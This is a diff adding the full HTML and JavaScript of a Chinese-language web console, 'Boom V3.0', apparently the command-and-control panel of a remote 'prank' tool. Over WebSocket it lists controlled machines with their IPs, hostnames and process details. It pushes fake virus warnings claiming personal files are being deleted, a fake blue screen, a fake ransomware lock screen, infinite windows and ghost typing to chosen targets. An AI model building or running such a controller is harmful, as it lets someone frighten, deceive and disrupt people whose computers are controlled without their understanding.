@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Boom V2 Console</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { min-height: 100%; background: #ede8de; }
+        body {
+            min-height: 100%;
+            color: #191817;
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background: #ede8de;
+            background-image: -webkit-linear-gradient(top, #faf8f1 0%, #e4ded2 100%);
+            background-image: linear-gradient(to bottom, #faf8f1 0%, #e4ded2 100%);
+            -webkit-text-size-adjust: 100%;
+        }
+        .page {
+            max-width: 1060px;
+            margin: 0 auto;
+            padding: 18px;
+        }
+        .brand {
+            margin: 4px 0 18px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid rgba(25,24,23,0.14);
+            overflow: hidden;
+        }
+        .brand-mark {
+            float: left;
+            width: 42px;
+            height: 42px;
+            line-height: 42px;
+            text-align: center;
+            color: #fff;
+            font-family: Georgia, "Times New Roman", serif;
+            font-size: 22px;
+            font-weight: bold;
+            background: #8d2822;
+            background-image: -webkit-linear-gradient(top, #b9473e 0%, #7e211d 100%);
+            background-image: linear-gradient(to bottom, #b9473e 0%, #7e211d 100%);
+            border: 1px solid #6f1c18;
+            border-radius: 12px;
+            box-shadow: 0 1px 0 rgba(255,255,255,0.45) inset, 0 2px 6px rgba(50,35,25,0.28);
+            text-shadow: 0 -1px 0 rgba(0,0,0,0.35);
+        }
+        .brand-copy { margin-left: 56px; }
+        .eyebrow {
+            color: #8d2822;
+            font-size: 11px;
+            line-height: 14px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        h1 {
+            margin-top: 2px;
+            color: #191817;
+            font-family: Georgia, "Times New Roman", serif;
+            font-size: 30px;
+            line-height: 34px;
+            font-weight: normal;
+            text-shadow: 0 1px 0 rgba(255,255,255,0.72);
+        }
+        .subhead {
+            margin-top: 4px;
+            color: #67605a;
+            font-size: 13px;
+            line-height: 18px;
+        }
+        .shell { overflow: hidden; }
+        .left-col {
+            float: left;
+            width: 38%;
+            padding-right: 12px;
+        }
+        .right-col {
+            float: left;
+            width: 62%;
+            padding-left: 12px;
+        }
+        .panel {
+            margin-bottom: 16px;
+            overflow: hidden;
+            background: #fffaf0;
+            border: 1px solid #cfc2ad;
+            border-radius: 14px;
+            box-shadow: 0 1px 0 rgba(255,255,255,0.9) inset, 0 8px 24px rgba(70,52,35,0.13);
+        }
+        .panel-dark {
+            color: #f7efe0;
+            background: #211f1d;
+            background-image: -webkit-linear-gradient(top, #2b2926 0%, #171615 100%);
+            background-image: linear-gradient(to bottom, #2b2926 0%, #171615 100%);
+            border-color: #161412;
+            box-shadow: 0 1px 0 rgba(255,255,255,0.08) inset, 0 10px 26px rgba(30,24,18,0.22);
+        }
+        .panel-title {
+            padding: 14px 16px;
+            color: #2b2926;
+            font-size: 13px;
+            line-height: 18px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border-bottom: 1px solid #ded3c3;
+            background: rgba(255,255,255,0.42);
+        }
+        .panel-dark .panel-title {
+            color: #f7efe0;
+            border-bottom-color: rgba(255,255,255,0.09);
+            background: rgba(255,255,255,0.03);
+        }
+        .panel-body { padding: 16px; }
+        .login-screen {
+            width: 100%;
+            max-width: 420px;
+            margin: 0 auto;
+            padding: 84px 18px 20px;
+        }
+        .login-screen .panel { margin-bottom: 0; }
+        .login-title {
+            padding-bottom: 16px;
+            color: #191817;
+            font-family: Georgia, "Times New Roman", serif;
+            font-size: 32px;
+            line-height: 36px;
+            text-align: center;
+            font-weight: normal;
+        }
+        .login-note {
+            margin-bottom: 16px;
+            color: #706860;
+            font-size: 13px;
+            line-height: 18px;
+            text-align: center;
+        }
+        .metric {
+            padding: 14px 0;
+            border-bottom: 1px solid rgba(80,68,54,0.14);
+            overflow: hidden;
+        }
+        .metric:first-child { padding-top: 0; }
+        .metric:last-child { border-bottom: none; padding-bottom: 0; }
+        .metric-label {
+            float: left;
+            width: 42%;
+            color: #766c61;
+            font-size: 12px;
+            line-height: 17px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .metric-value {
+            float: right;
+            width: 56%;
+            color: #191817;
+            font-family: Menlo, Consolas, "Courier New", monospace;
+            font-size: 13px;
+            line-height: 17px;
+            text-align: right;
+            font-weight: bold;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+        .panel-dark .metric { border-bottom-color: rgba(255,255,255,0.09); }
+        .panel-dark .metric-label { color: #b7ad9d; }
+        .panel-dark .metric-value { color: #fff8e8; }
+        .connected { color: #397f35; }
+        .disconnected { color: #a8322c; }
+        .panel-dark .connected { color: #83c47b; }
+        .panel-dark .disconnected { color: #ef8177; }
+        .status-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            margin-right: 6px;
+            border-radius: 8px;
+            box-shadow: 0 1px 0 rgba(255,255,255,0.6), 0 0 3px rgba(0,0,0,0.35) inset;
+        }
+        .dot-online { background: #4fa245; }
+        .dot-offline { background: #8a837b; }
+        .input {
+            width: 100%;
+            min-height: 43px;
+            margin-bottom: 12px;
+            padding: 11px 13px;
+            color: #201f1d;
+            font-size: 15px;
+            background: #fffef9;
+            border: 1px solid #bdb09d;
+            border-radius: 10px;
+            outline: none;
+            box-shadow: 0 1px 3px rgba(25,24,23,0.09) inset, 0 1px 0 rgba(255,255,255,0.9);
+            -webkit-appearance: none;
+        }
+        .input:focus {
+            border-color: #8d2822;
+            box-shadow: 0 0 0 2px rgba(141,40,34,0.16), 0 1px 3px rgba(25,24,23,0.09) inset;
+        }
+        select.input { background: #fffef9; }
+        .form-label {
+            display: block;
+            margin: 4px 0 6px;
+            color: #766c61;
+            font-size: 12px;
+            line-height: 16px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            min-height: 43px;
+            margin-bottom: 10px;
+            padding: 11px 13px;
+            color: #2b2926;
+            font-size: 14px;
+            line-height: 18px;
+            font-weight: bold;
+            background: #eee4d2;
+            background-image: -webkit-linear-gradient(top, #fffaf0 0%, #d9cdbb 100%);
+            background-image: linear-gradient(to bottom, #fffaf0 0%, #d9cdbb 100%);
+            border: 1px solid #b5a691;
+            border-radius: 10px;
+            cursor: pointer;
+            text-shadow: 0 1px 0 rgba(255,255,255,0.8);
+            box-shadow: 0 1px 0 rgba(255,255,255,0.88) inset, 0 2px 5px rgba(55,40,28,0.13);
+            -webkit-appearance: none;
+        }
+        .btn:active {
+            background-image: -webkit-linear-gradient(top, #d4c7b4 0%, #fff7eb 100%);
+            background-image: linear-gradient(to bottom, #d4c7b4 0%, #fff7eb 100%);
+        }
+        .btn:disabled { color: #aaa197; cursor: default; }
+        .btn-primary, .btn-danger {
+            color: #fff;
+            border-color: #70201c;
+            background: #8d2822;
+            background-image: -webkit-linear-gradient(top, #bd4a40 0%, #79211d 100%);
+            background-image: linear-gradient(to bottom, #bd4a40 0%, #79211d 100%);
+            text-shadow: 0 -1px 0 rgba(0,0,0,0.42);
+        }
+        .btn-primary:active, .btn-danger:active {
+            background-image: -webkit-linear-gradient(top, #6d1e1a 0%, #ad4038 100%);
+            background-image: linear-gradient(to bottom, #6d1e1a 0%, #ad4038 100%);
+        }
+        .btn-blue {
+            color: #fff;
+            border-color: #314b68;
+            background: #3e6385;
+            background-image: -webkit-linear-gradient(top, #6388a8 0%, #31506d 100%);
+            background-image: linear-gradient(to bottom, #6388a8 0%, #31506d 100%);
+            text-shadow: 0 -1px 0 rgba(0,0,0,0.35);
+        }
+        .btn-purple {
+            color: #fff;
+            border-color: #67516a;
+            background: #806a83;
+            background-image: -webkit-linear-gradient(top, #9c86a0 0%, #68536c 100%);
+            background-image: linear-gradient(to bottom, #9c86a0 0%, #68536c 100%);
+            text-shadow: 0 -1px 0 rgba(0,0,0,0.35);
+        }
+        .btn-orange {
+            color: #fff;
+            border-color: #85562d;
+            background: #a96f38;
+            background-image: -webkit-linear-gradient(top, #cc9255 0%, #8f5a2b 100%);
+            background-image: linear-gradient(to bottom, #cc9255 0%, #8f5a2b 100%);
+            text-shadow: 0 -1px 0 rgba(0,0,0,0.35);
+        }
+        .button-grid { overflow: hidden; margin-left: -5px; margin-right: -5px; }
+        .button-grid .btn {
+            float: left;
+            width: 50%;
+            min-height: 48px;
+            margin: 0 0 10px 0;
+            border-left-width: 5px;
+            border-right-width: 5px;
+            border-left-color: transparent;
+            border-right-color: transparent;
+            border-radius: 0;
+            background-clip: padding-box;
+            -webkit-background-clip: padding-box;
+        }
+        .client-item {
+            margin-bottom: 12px;
+            padding: 13px;
+            background: #fffdf7;
+            border: 1px solid #d5c8b4;
+            border-radius: 12px;
+            box-shadow: 0 1px 0 rgba(255,255,255,0.9) inset, 0 2px 7px rgba(55,40,28,0.08);
+        }
+        .client-header {
+            margin-bottom: 10px;
+            padding-bottom: 9px;
+            border-bottom: 1px solid #eadfce;
+        }
+        .client-id {
+            color: #8d2822;
+            font-family: Menlo, Consolas, "Courier New", monospace;
+            font-size: 13px;
+            line-height: 18px;
+            font-weight: bold;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+        .client-grid { overflow: hidden; color: #5f5850; font-size: 12px; line-height: 17px; }
+        .client-field {
+            float: left;
+            width: 50%;
+            min-height: 25px;
+            padding: 3px 10px 3px 0;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+        .client-field b { color: #24221f; font-weight: bold; }
+        .client-meta {
+            clear: both;
+            margin-top: 9px;
+            padding-top: 9px;
+            color: #7d746a;
+            font-size: 11px;
+            line-height: 16px;
+            border-top: 1px solid #eadfce;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+        .control-section, .config-section { display: none; }
+        .empty-note { color: #7d746a; font-size: 13px; line-height: 18px; }
+        .msg {
+            position: fixed;
+            top: 14px;
+            left: 12px;
+            right: 12px;
+            z-index: 9999;
+            padding: 12px 15px;
+            color: #fff;
+            font-size: 14px;
+            line-height: 18px;
+            text-align: center;
+            background: rgba(25,24,23,0.94);
+            border: 1px solid rgba(255,255,255,0.12);
+            border-radius: 11px;
+            opacity: 0;
+            box-shadow: 0 8px 24px rgba(25,24,23,0.26);
+            -webkit-transition: opacity 0.25s;
+            transition: opacity 0.25s;
+        }
+        .msg.show { opacity: 1; }
+        .msg.error { background: rgba(132,32,28,0.96); }
+        .clear { clear: both; }
+        @media (max-width: 720px) {
+            .page { padding: 10px; }
+            .brand { margin-bottom: 12px; padding-bottom: 12px; }
+            .brand-mark { width: 38px; height: 38px; line-height: 38px; border-radius: 10px; }
+            .brand-copy { margin-left: 50px; }
+            h1 { font-size: 24px; line-height: 28px; }
+            .left-col, .right-col { float: none; width: auto; padding: 0; }
+            .panel-body { padding: 13px; }
+            .metric-label, .metric-value { float: none; display: block; width: auto; text-align: left; }
+            .metric-label { margin-bottom: 3px; }
+            .button-grid { margin-left: 0; margin-right: 0; }
+            .button-grid .btn {
+                float: none;
+                width: 100%;
+                border-left-width: 1px;
+                border-right-width: 1px;
+                border-left-color: #b5a691;
+                border-right-color: #b5a691;
+                border-radius: 10px;
+            }
+            .client-field { float: none; width: auto; min-height: 0; padding-right: 0; }
+            .login-screen { padding-top: 44px; }
+        }
+    </style>
+</head>
+<body>
+    <div id="loginScreen" class="login-screen">
+        <div class="brand" style="border-bottom:none;margin-bottom:14px;">
+            <div class="brand-mark">B</div>
+            <div class="brand-copy">
+                <div class="eyebrow">私人专属控制台</div>
+                <h1>Boom V3.0</h1>
+                <div class="subhead">一个轻量级、带服务端版本感知的整蛊管理中心。</div>
+            </div>
+        </div>
+        <div class="panel">
+            <div class="panel-title">身份验证</div>
+            <div class="panel-body">
+                <div style="text-align:left; margin-bottom:10px;">
+                    <label class="form-label" style="display:block; margin-bottom:4px; font-weight:bold;">服务器地址</label>
+                    <input class="input" type="text" id="serverInput" placeholder="例如: wss://your-app.up.railway.app/controller" style="margin-bottom:0;">
+                </div>
+                <div style="text-align:left; margin-bottom:12px;">
+                    <label class="form-label" style="display:block; margin-bottom:4px; font-weight:bold;">控制令牌 (Token)</label>
+                    <input class="input" type="password" id="tokenInput" placeholder="请输入 Token" style="margin-bottom:0;">
+                </div>
+                <button class="btn btn-primary" id="loginBtn" onclick="login()">进入控制台</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="mainScreen" style="display:none;">
+        <div class="page">
+            <div class="brand">
+                <div class="brand-mark">B</div>
+                <div class="brand-copy">
+                    <div class="eyebrow">boom 远控面板</div>
+                    <h1>战术指挥中心</h1>
+                    <div class="subhead">服务端状态监控、在线主机管理以及指令下发集于一处。</div>
+                </div>
+            </div>
+
+            <div class="shell">
+                <div class="left-col">
+                    <div class="panel panel-dark">
+                        <div class="panel-title">服务端状态</div>
+                        <div class="panel-body">
+                            <div class="metric"><span class="metric-label">连接状态</span><span class="metric-value" id="wsStatus"><span class="status-dot dot-offline"></span>已断开</span></div>
+                            <div class="metric"><span class="metric-label">服务地址</span><span class="metric-value" id="wsUrlDisplay">未连接</span></div>
+                            <div class="metric"><span class="metric-label">服务端版本</span><span class="metric-value" id="serverVersion">未知</span></div>
+                            <div class="metric"><span class="metric-label">系统服务</span><span class="metric-value" id="serverService">boom-server</span></div>
+                            <div class="metric"><span class="metric-label">上次检查</span><span class="metric-value" id="versionCheckedAt">从未</span></div>
+                            <div class="metric"><span class="metric-label">在线受控端</span><span class="metric-value connected" id="clientCount">0</span></div>
+                            <button class="btn btn-primary" id="connectBtn" onclick="toggleConnection()">连接服务器</button>
+                            <button class="btn" id="versionBtn" onclick="requestServerStatus()" disabled>检查版本</button>
+                        </div>
+                    </div>
+
+                    <div class="panel config-section" id="configCard">
+                        <div class="panel-title">弹窗自定义参数</div>
+                        <div class="panel-body">
+                            <label class="form-label">弹窗标题</label>
+                            <input class="input" type="text" id="cfgTitle" value="系统警告">
+                            <label class="form-label">警告主文本</label>
+                            <input class="input" type="text" id="cfgText1" value="警告：检测到致命病毒！">
+                            <label class="form-label">警告副文本</label>
+                            <input class="input" type="text" id="cfgText2" value="您的计算机已被感染，正在删除所有个人文件...">
+                            <label class="form-label">按钮文本</label>
+                            <input class="input" type="text" id="cfgBtn" value="立即清理">
+                            <label class="form-label">目标称呼</label>
+                            <input class="input" type="text" id="cfgName" value="目标主机">
+                            <button class="btn btn-primary" onclick="sendConfig()">下发配置</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="right-col">
+                    <div class="panel control-section" id="clientListCard">
+                        <div class="panel-title">在线受控端</div>
+                        <div class="panel-body">
+                            <div id="clientList"><span class="empty-note">等待客户端接入...</span></div>
+                        </div>
+                    </div>
+
+                    <div class="panel control-section" id="controlCard">
+                        <div class="panel-title">战术指令下发</div>
+                        <div class="panel-body">
+                            <label class="form-label">目标选择</label>
+                            <select class="input" id="targetSelect"><option value="">全部受控端</option></select>
+                            
+                            <label class="form-label" style="margin-top: 15px;">视觉弹窗系 (Visual Alerts)</label>
+                            <div class="button-grid">
+                                <button class="btn btn-orange" onclick="sendCommand('stage_1')">Stage 1 - 单窗警告</button>
+                                <button class="btn btn-orange" onclick="sendCommand('stage_2')">Stage 2 - 连环弹窗</button>
+                                <button class="btn btn-danger" onclick="sendCommand('stage_force')">强制封锁通告</button>
+                                <button class="btn btn-danger" onclick="sendCommand('prank_infinite_window')">窗口无限繁殖</button>
+                                <div class="clear"></div>
+                            </div>
+
+                            <label class="form-label" style="margin-top: 10px;">系统伪装系 (System Spoofing)</label>
+                            <div class="button-grid">
+                                <button class="btn btn-blue" onclick="sendCommand('stage_3')">Stage 3 - 假蓝屏死机</button>
+                                <button class="btn btn-purple" onclick="sendCommand('stage_4')">Stage 4 - 伪造勒索锁屏</button>
+                                <button class="btn" onclick="sendCommand('prank_fake_update')">伪造系统升级</button>
+                                <button class="btn btn-purple" onclick="sendCommand('prank_glitch')">屏幕故障艺术</button>
+                                <button class="btn btn-purple" onclick="sendCommand('prank_fake_notify')">假系统通知</button>
+                                <div class="clear"></div>
+                            </div>
+
+                            <label class="form-label" style="margin-top: 10px;">物理干扰与整蛊 (Physical & Trolls)</label>
+                            <div class="button-grid">
+                                <button class="btn" onclick="sendCommand('prank_desktop')">窗口随机瞬移</button>
+                                <button class="btn" onclick="sendCommand('prank_flip_screen')">翻转屏幕</button>
+                                <button class="btn" onclick="sendCommand('prank_ghost_typing')">幽灵打字机</button>
+                                <button class="btn btn-orange" onclick="sendCommand('prank_rickroll')">瑞克摇 (Rickroll)</button>
+                                <div class="clear"></div>
+                            </div>
+
+                            <label class="form-label" style="margin-top: 10px;">安全控制 (Safety Controls)</label>
+                            <div class="button-grid">
+                                <button class="btn btn-danger" style="width: 100%; border-left-width: 1px; border-right-width: 1px; border-radius: 10px;" onclick="sendCommand('exit')">一键清除恢复 (Exit)</button>
+                                <div class="clear"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="clear"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="msg" id="msg"></div>
+
+    <script>
+        var ws = null;
+        var pollTimer = null;
+        var token = "";
+        var serverUrl = "";
+        var clients = [];
+
+        function $(id) { return document.getElementById(id); }
+
+        window.onload = function() {
+            var cachedServer = localStorage.getItem("boom_server_url");
+            var cachedToken = localStorage.getItem("boom_token");
+            if (cachedServer) {
+                $("serverInput").value = cachedServer;
+            } else {
+                if (window.location.protocol === "https:") {
+                    $("serverInput").value = "wss://" + window.location.host + "/controller";
+                } else if (window.location.protocol === "http:") {
+                    $("serverInput").value = "ws://" + window.location.host + "/controller";
+                } else {
+                    $("serverInput").value = "wss://your-server-domain/controller";
+                }
+            }
+            if (cachedToken) {
+                $("tokenInput").value = cachedToken;
+            }
+        };
+
+        function getSectionNodes() {
+            var nodes = [];
+            var all = document.getElementsByTagName("div");
+            var i;
+            for (i = 0; i < all.length; i++) {
+                if ((" " + all[i].className + " ").indexOf(" control-section ") >= 0 ||
+                    (" " + all[i].className + " ").indexOf(" config-section ") >= 0) {
+                    nodes.push(all[i]);
+                }
+            }
+            return nodes;
+        }
+
+        function showMsg(text, isErr) {
+            var m = $("msg");
+            m.innerHTML = escapeHtml(text);
+            m.className = isErr ? "msg error show" : "msg show";
+            setTimeout(function() { m.className = "msg"; }, 2000);
+        }
+
+        function login() {
+            serverUrl = $("serverInput").value.replace(/^\s+|\s+$/g, "");
+            token = $("tokenInput").value.replace(/^\s+|\s+$/g, "");
+            if (!serverUrl) { showTokenError("Server URL is required"); return; }
+            if (!token) { showTokenError("Token is required"); return; }
+            if (token.length < 8) { showTokenError("Token is too short"); return; }
+            hideTokenError();
+            $("loginBtn").disabled = true;
+            $("loginBtn").innerHTML = "Connecting...";
+            localStorage.setItem("boom_server_url", serverUrl);
+            localStorage.setItem("boom_token", token);
+            connect();
+        }
+
+        function showTokenError(msg) {
+            var errEl = $("tokenError");
+            if (!errEl) {
+                errEl = document.createElement("div");
+                errEl.id = "tokenError";
+                errEl.style.cssText = "color:#8d2822;font-size:13px;margin-top:8px;text-align:center;";
+                $("tokenInput").parentNode.insertBefore(errEl, $("tokenInput").nextSibling);
+            }
+            errEl.innerHTML = "&#9888; " + escapeHtml(msg);
+        }
+
+        function hideTokenError() {
+            var errEl = $("tokenError");
+            if (errEl) errEl.innerHTML = "";
+        }
+
+        function safeText(value) {
+            if (value === undefined || value === null || value === "") return "Unknown";
+            return String(value);
+        }
+
+        function escapeHtml(value) {
+            return safeText(value)
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+        }
+
+        function formatTime(value) {
+            if (!value || value === "Unknown") return "Unknown";
+            var d = new Date(value);
+            if (isNaN(d.getTime())) return escapeHtml(value);
+            return d.toLocaleString();
+        }
+
+        function fieldHtml(label, value) {
+            return '<div class="client-field"><b>' + label + ":</b> " + escapeHtml(value) + "</div>";
+        }
+
+        function connect() {
+            try {
+                var url = serverUrl || $("serverInput").value.replace(/^\s+|\s+$/g, "");
+                if (url.indexOf("ws://") !== 0 && url.indexOf("wss://") !== 0) {
+                    throw new Error("Invalid URL protocol. Must start with ws:// or wss://");
+                }
+                if ($("wsUrlDisplay")) {
+                    $("wsUrlDisplay").innerHTML = escapeHtml(url);
+                }
+                ws = new WebSocket(url);
+                ws.onopen = function() {
+                    ws.send(JSON.stringify({type: "register", client_id: "web_v2_controller", token: token}));
+                };
+                ws.onmessage = function(e) {
+                    var data = JSON.parse(e.data);
+                    if (data.type === "clients_list") {
+                        updateClientList(data.clients);
+                    } else if (data.type === "server_status") {
+                        updateServerStatus(data);
+                    } else if (data.type === "welcome") {
+                        $("loginScreen").style.display = "none";
+                        $("mainScreen").style.display = "block";
+                        updateStatus(true);
+                        showMsg("Connected");
+                        requestServerStatus();
+                        ws.send(JSON.stringify({type: "list_clients"}));
+                        startPoll();
+                    } else if (data.type === "error") {
+                        showTokenError(data.message || "Invalid token");
+                        $("loginBtn").disabled = false;
+                        $("loginBtn").innerHTML = "Enter console";
+                        ws.close();
+                    }
+                };
+                ws.onclose = function() {
+                    ws = null;
+                    updateStatus(false);
+                    stopPoll();
+                    $("loginBtn").disabled = false;
+                    $("loginBtn").innerHTML = "Enter console";
+                    if ($("loginScreen").style.display === "none") showMsg("Disconnected", true);
+                };
+                ws.onerror = function() {
+                    showTokenError("Failed to connect to server");
+                    $("loginBtn").disabled = false;
+                    $("loginBtn").innerHTML = "Enter console";
+                };
+            } catch(e) {
+                showTokenError("Connection failed: " + e.message);
+                $("loginBtn").disabled = false;
+                $("loginBtn").innerHTML = "Enter console";
+            }
+        }
+
+        function toggleConnection() {
+            if (ws) {
+                ws.close();
+                ws = null;
+                updateStatus(false);
+                stopPoll();
+                $("loginScreen").style.display = "block";
+                $("mainScreen").style.display = "none";
+                $("loginBtn").disabled = false;
+                $("loginBtn").innerHTML = "Enter console";
+                hideTokenError();
+            } else {
+                connect();
+            }
+        }
+
+        function updateStatus(online) {
+            var s = $("wsStatus");
+            var b = $("connectBtn");
+            var versionBtn = $("versionBtn");
+            var secs = getSectionNodes();
+            var i;
+            if (online) {
+                s.innerHTML = '<span class="status-dot dot-online"></span>Connected';
+                s.className = "metric-value connected";
+                b.innerHTML = "Disconnect";
+                versionBtn.disabled = false;
+                for (i = 0; i < secs.length; i++) secs[i].style.display = "block";
+            } else {
+                s.innerHTML = '<span class="status-dot dot-offline"></span>Disconnected';
+                s.className = "metric-value disconnected";
+                b.innerHTML = "Connect server";
+                versionBtn.disabled = true;
+                $("serverVersion").innerHTML = "Unknown";
+                $("versionCheckedAt").innerHTML = "Never";
+                for (i = 0; i < secs.length; i++) secs[i].style.display = "none";
+                $("clientList").innerHTML = '<span class="empty-note">Waiting for clients...</span>';
+                $("targetSelect").innerHTML = '<option value="">All clients</option>';
+                $("clientCount").innerHTML = "0";
+            }
+        }
+
+        function requestServerStatus() {
+            if (!ws || ws.readyState !== 1) {
+                showMsg("Not connected", true);
+                return;
+            }
+            $("versionBtn").disabled = true;
+            $("versionBtn").innerHTML = "Checking...";
+            ws.send(JSON.stringify({type: "server_status"}));
+        }
+
+        function updateServerStatus(status) {
+            var systemd = status.systemd || {};
+            $("serverVersion").innerHTML = escapeHtml(status.server_version || "Unknown");
+            $("serverService").innerHTML = escapeHtml(status.service_name || "boom-server");
+            $("versionCheckedAt").innerHTML = formatTime(status.server_time);
+            $("versionBtn").disabled = false;
+            $("versionBtn").innerHTML = "Check version";
+            if (systemd.ActiveState) {
+                $("serverService").innerHTML = escapeHtml((status.service_name || "boom-server") + " / " + systemd.ActiveState);
+            }
+        }
+
+        function updateClientList(list) {
+            clients = list || [];
+            $("clientCount").innerHTML = String(clients.length);
+            var el = $("clientList");
+            var sel = $("targetSelect");
+            var html = "";
+            var i;
+            var c;
+            if (clients.length === 0) {
+                el.innerHTML = '<span class="empty-note">No online clients</span>';
+                sel.innerHTML = '<option value="">All clients</option>';
+                return;
+            }
+            sel.innerHTML = '<option value="">All clients</option>';
+            for (i = 0; i < clients.length; i++) {
+                c = clients[i];
+                html += '<div class="client-item">';
+                html += '<div class="client-header"><span class="client-id"><span class="status-dot dot-online"></span>' + escapeHtml(c.id) + "</span></div>";
+                html += '<div class="client-grid">';
+                html += fieldHtml("Local IP", c.local_ip || c.ip);
+                html += fieldHtml("Remote IP", c.remote_ip);
+                html += fieldHtml("Hostname", c.hostname);
+                html += fieldHtml("System", c.system);
+                html += fieldHtml("Platform", c.platform);
+                html += fieldHtml("Timezone", c.timezone);
+                html += fieldHtml("Screen", c.screen);
+                html += fieldHtml("PID", c.pid);
+                html += fieldHtml("Python", c.python);
+                html += fieldHtml("Stage", c.stage);
+                html += fieldHtml("Mode", c.background ? "Background" : "Window");
+                html += fieldHtml("Version", c.client_version);
+                html += '<div class="clear"></div></div>';
+                html += '<div class="client-meta">Connected: ' + formatTime(c.connected_at) + " &nbsp; Last seen: " + formatTime(c.last_seen) + "</div>";
+                html += "</div>";
+                sel.innerHTML += '<option value="' + escapeHtml(c.id) + '">' + escapeHtml(c.id) + " (" + escapeHtml(c.local_ip || c.ip) + ")</option>";
+            }
+            el.innerHTML = html;
+        }
+
+        function startPoll() {
+            stopPoll();
+            pollTimer = setInterval(function() {
+                if (ws && ws.readyState === 1) ws.send(JSON.stringify({type: "list_clients"}));
+            }, 3000);
+        }
+
+        function stopPoll() {
+            if (pollTimer) {
+                clearInterval(pollTimer);
+                pollTimer = null;
+            }
+        }
+
+        function sendCommand(cmd) {
+            if (!ws || ws.readyState !== 1) { showMsg("Not connected", true); return; }
+            var target = $("targetSelect").value;
+            var names = {
+                stage_1: "Stage 1",
+                stage_2: "Stage 2",
+                stage_3: "Blue screen",
+                stage_4: "Ransom screen",
+                stage_force: "Force notice",
+                prank_desktop: "Move windows",
+                prank_flip_screen: "Flip screen",
+                prank_fake_update: "Fake update",
+                prank_glitch: "Glitch screen",
+                prank_infinite_window: "Infinite windows",
+                prank_ghost_typing: "Ghost typing",
+                prank_rickroll: "Rickroll",
+                prank_fake_notify: "Fake notification",
+                exit: "Close windows"
+            };
+            ws.send(JSON.stringify({type: "control", command: cmd, target_client: target || null, config: null}));
+            showMsg("Sent: " + (names[cmd] || cmd));
+        }
+
+        function sendConfig() {
+            if (!ws || ws.readyState !== 1) { showMsg("Not connected", true); return; }
+            var config = {
+                stage1_title: $("cfgTitle").value,
+                stage1_text1: $("cfgText1").value,
+                stage1_text2: $("cfgText2").value,
+                stage1_btn: $("cfgBtn").value,
+                target_name: $("cfgName").value
+            };
+            var target = $("targetSelect").value;
+            ws.send(JSON.stringify({type: "control", command: null, target_client: target || null, config: config}));
+            showMsg("Config sent");
+        }
+
+        $("tokenInput").onkeyup = function(e) {
+            e = e || window.event;
+            if ((e.keyCode || e.which) === 13) login();
+        };
+        $("serverInput").onkeyup = function(e) {
+            e = e || window.event;
+            if ((e.keyCode || e.which) === 13) login();
+        };
+    </script>
+</body>
+</html>
